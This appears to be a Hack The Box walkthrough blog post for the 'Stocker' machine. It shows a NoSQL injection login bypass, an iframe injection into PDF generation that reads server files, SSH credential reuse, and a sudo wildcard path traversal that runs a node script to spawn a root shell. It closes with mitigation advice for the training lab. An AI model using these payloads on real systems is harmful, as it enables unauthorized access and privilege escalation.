---
layout: post
title: Hack The Box Walkthrough - Stocker
date: 2023-06-24
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2023/06/HTB/Stocker
img: 2023/06/Stocker/Stocker.png
---

In Stocker, I exploited a NoSQL Injection to login an application before using a Local File Inclusion vulnerability to extract files. Then I used an unsecure sudo configuration to become root.

* Room: Stocker
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Stocker](https://app.hackthebox.com/machines/Stocker)
* Author: [JoshSH](https://app.hackthebox.com/users/269501)

## Enumeration

As I always do, I started the box by looking for open ports with RustScan.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.196:22
Open 10.10.11.196:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 18:56 EST
Scanned at 2023-01-31 18:56:34 EST for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/Jyuj3D7FuZQdudxWlH081Q6WkdTVz6G05mFSFpBpycfOrwuJpQ6oJV1I4J6UeXg+o5xHSm+ANLhYEI6T/JMnYSyEmVq/QVactDs9ixhi+j0R0rUrYYgteX7XuOT2g4ivyp1zKQP1uKYF2lGVnrcvX4a6ds4FS8mkM2o74qeZj6XfUiCYdPSVJmFjX/TgTzXYH
t7kHj0vLtMG63sxXQDVLC5NwLs3VE61qD4KmhCfu+9viOBvA1ZID4Bmw8vgi0b5FfQASbtkylpRxdOEyUxGZ1dbcJzT+wGEhalvlQl9CirZLPMBn4YMC86okK/Kc0Wv+X/lC+4UehL//U3MkD9XF3yTmq+UVF/qJTrs9Y15lUOu3bJ9kpP9VDbA6NNGi1HdLyO4CbtifsWblmmoRWIr+U8B2wP/D9whWGwRJPBBwTJW
ZvxvZz3llRQhq/8Np0374iHWIEG+k9U9Am6rFKBgGlPUcf6Mg7w4AFLiFEQaQFRpEbf+xtS1YMLLqpg3qB0=
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgPXCNqX65/kNxcEEVPqpV7du+KsPJokAydK/wx1GqHpuUm3lLjMuLOnGFInSYGKlCK1MLtoCX6DjVwx6nWZ5w=
|   256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDyp1s8jG+rEbfeqAQbCqJw5+Y+T17PRzOcYd+W32hF
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

...

Nmap done: 1 IP address (1 host up) scanned in 8.05 seconds
```

Port 22 (SSH) and 80 (HTTP) were open. The site on port 80 was redirecting to 'http://stocker.htb' so I added that to my hosts file.

I then used wfuzz to look for subdomains of stocker.htb.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -t30 --hw 12 -H "Host:FUZZ.stocker.htb" "http://stocker.htb/"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 /home/ehogue/.local/lib/python3.10/site-packages/requests/__init__.py:87: RequestsDependencyWarning:urllib3 (1.26.5) or chardet (5.1.0) doesn't match a supported version!
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://stocker.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000134112:   302        0 L      4 W        28 Ch       "dev"

Total time: 0
Processed Requests: 648201
Filtered Requests: 648200
Requests/sec.: 0
```

It found one, I added it to my hosts file. I used Feroxbuster to look for hidden files on both domains. It did not find anything interesting.

## Websites

I opened a browser and looked at both sites.

![stocker.htb](/assets/images/2023/06/Stocker/StockersSite.png "stocker.htb")

The main site did not have much on it. It looked like a static page. There was a quote from the staff, I took note of the potential username.


> "I can't wait for people to use our new site! It's so fast and easy to use! We're working hard to give you the best experience possible, and we're nearly ready for it to go live!" 
>  Angoose Garden, Head of IT at Stockers Ltd.

Next, I looked at the site on 'dev.stocker.htb'.

![dev.stocker.htb](/assets/images/2023/06/Stocker/LoginPage.png "dev.stocker.htb")

Since Feroxbuster had not found anything else, I tried exploiting the login page. I started by trying SQL Injection, but it did not appear to work.

I wanted to test NoSQL Injection next. So I changed the content type to see if I can send some JSON.

```
Content-Type: application/json
```

It gave me an error that confirmed I could send JSON. It also gave me the path to the application, which was useful later.

```html
<pre>SyntaxError: Unexpected token u in JSON at position 0<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at createStrictSyntaxError (/var/www/dev/node_modules/body-parser/lib/types/json.js:160:10)<br> &nbsp; &nbsp;at parse (/var/www/dev/node_modules/body-parser/lib/types/json.js:83:15)<br> &nbsp; &nbsp;at /var/www/dev/node_modules/body-parser/lib/read.js:128:18<br> &nbsp; &nbsp;at AsyncResource.runInAsyncScope (node:async_hooks:203:9)<br> &nbsp; &nbsp;at invokeCallback (/var/www/dev/node_modules/raw-body/index.js:231:16)<br> &nbsp; &nbsp;at done (/var/www/dev/node_modules/raw-body/index.js:220:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/var/www/dev/node_modules/raw-body/index.js:280:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (node:events:513:28)<br> &nbsp; &nbsp;at endReadableNT (node:internal/streams/readable:1359:12)</pre>
```

I used [Caido](https://caido.io/) to intercept the login post request and modify it with some NoSQL Injection.

```http
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Origin: http://dev.stocker.htb
Connection: keep-alive
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3A6WpnzeP3GgUM-oSSXJclMl7NHWIaKx_i.SHl402IfoFmKczmxhVSHVjnj6bQBzwQh%2FjcL6aSSAJg
Upgrade-Insecure-Requests: 1
Content-Length: 101

{
    "username": {
        "$ne": "aaa"
    },
    "password": {
        "$ne": "aaa"
    }
}
```

It gave me a cookie and redirected me to the 'stock' page.

```http
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 01 Feb 2023 23:40:04 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: keep-alive
X-Powered-By: Express
Location: /stock
Vary: Accept
Set-Cookie: connect.sid=s%3AYUlMAjvWCRTh9JTq8BoSQtLz1QX4XP87.Wc10Lfnf9Vz%2BvcLyTlgfPGFzKfAKqrt1PqOTmB0j%2Frw; Path=/; HttpOnly

<p>Found. Redirecting to <a href="/stock">/stock</a></p>
```

### Local File Inclusion (LFI)

Once connected, I was redirected to a small e-commerce site. 

![Stock](/assets/images/2023/06/Stocker/StockPage.png "Stock")

I tried buying some stuff. 

![Thank You](/assets/images/2023/06/Stocker/ThankYouPage.png "Thank You")

Once I completed a purchase, the 'Thank You' page contained a link to a PDF with the details of the transaction.

![PDF](/assets/images/2023/06/Stocker/PDF.png "PDF")

I looked at the payload sent when I sent my order. It contained my basket in JSON.

```http
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 162
Connection: keep-alive
Cookie: connect.sid=s%3AaUTySi_6ksB4-ipFDxrdbBcAkg889Wm7.tLzx3LN2TCdJOQDpWOVExOp0I70bQ%2FirloAw9MtBs9c

{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a8d",
      "title": "Cup",
      "description": "It's a red cup.",
      "image": "red-cup.jpg",
      "price": 32,
      "currentStock": 4,
      "__v": 0,
      "amount": 1
    }
  ]
}
```

I tried using Caido's Replay to modify some values in the JSON. The title, price, and amount were reflected in the PDF. I tried sending Server Side Template Injection (SSTI) payloads, but none of them worked. I sent some HTML in the title, and that got rendered.

```json
{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a8d",
      "title": "<s>title</s>",
      "description": "DESC",
      "image": "red-cup.jpg",
      "price": 11,
      "currentStock": 4,
      "__v": 0,
      "amount": 22
    }
  ]
}
```

![Strikethrough](/assets/images/2023/06/Stocker/Strikethrough.png "Strikethrough")

I used that to add an iframe to the page, loading a file from the server.

```json
{
    "basket": [
        {
        "_id": "111",
        "title": "<iframe src='file:///etc/passwd' width=500 height=700> ",
        "description": "333",
        "image": "http://10.10.14.7/test",
        "price": 555,
        "currentStock": 666,
        "__v": 777,
        "amount": 888
        }
    ]
}
```

This worked. The PDF contained the content of the '/etc/passwd' file.

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network
Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd
Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time
Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core
Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh
user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

I was able to read files from the server. From the error I received when I tried JSON on the login page, I knew the path for the application. I used it to read common JavaScript files.

```json
"title": "<iframe src='file:///var/www/dev/index.js' width=500 height=700> ",
```

The application code was in 'index.js'.

```js
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI =
"mongodb://dev:REDACTED@localhost/dev?
authSource=admin&w=1";
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
session({
secret: randomBytes(32).toString("hex"),
resave: false,
saveUninitialized: true,
store: MongoStore.create({
mongoUrl: dbURI,
}),
})
);
```

The file contained the credentials for the MongoDB connection. I tried using the password to SSH as 'angoose'. 

```bash
$ ssh angoose@target
The authenticity of host 'target (10.10.11.196)' can't be established.
ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
angoose@target's password:

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$ ls
user.txt

angoose@stocker:~$ cat user.txt
REDACTED
```

It worked, and I got the user flag.

## Getting root

Once on the machine, getting root was very easy. I checked if I could run anything with sudo.

```bash
angoose@stocker:~$ sudo -l
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

I was able to run node as root. The configuration was trying to restrict it to the js files in '/usr/local/scripts'. However, the wildcard (*) used in the path allowed me to use `../` and run scripts from anywhere on the server.

```bash
angoose@stocker:~$ cat exploit.js
console.log('PWNED');

angoose@stocker:~$ sudo node /usr/local/scripts/../../../home/angoose/exploit.js
PWNED
```

Knowing that, I used a [simple node script](https://gtfobins.github.io/gtfobins/node/#shell) to execute bash as root.

```bash
angoose@stocker:~$ cat exploit.js
require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})

angoose@stocker:~$ sudo node /usr/local/scripts/../../../home/angoose/exploit.js

root@stocker:/home/angoose# whoami
root

root@stocker:/home/angoose# cat /root/root.txt
REDACTED
```

## Mitigation

The first problem with the application is the code to the login function.

```js
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) return res.redirect("/login?error=login-error");

  // TODO: Implement hashing

  const user = await mongoose.model("User").findOne({ username, password });

  if (!user) return res.redirect("/login?error=login-error");

  req.session.user = user.id;

  console.log(req.session);

  return res.redirect("/stock");
});
```

This code does not do any validation on the data sent to the application. It just sends it directly to the database. Simply validating that the username and password were strings would have prevented the injection.

Next, the code that generates the HTML for the PDF uses user's input in the HTML. 

```js
${order.items.map(
  (item) => `<tr>
    <th scope="col">${item.title}</th>
    <th scope="col" id="cart-total">${parseFloat(item.price).toFixed(2)}</th>
    <th scope="col">${item.amount}</th>
</tr>`
)}
```

All this data should be read from the database. The posted order should only contain the identifiers and quantities. And all the values should be validated before being used and escaped when outputted. 

The password used for the database should not have been reused for the user on the server. And lastly, the sudo configuration should not use wildcards in the path. Listing all the scripts that could be run would be more work, but it would have prevented me from running my script.
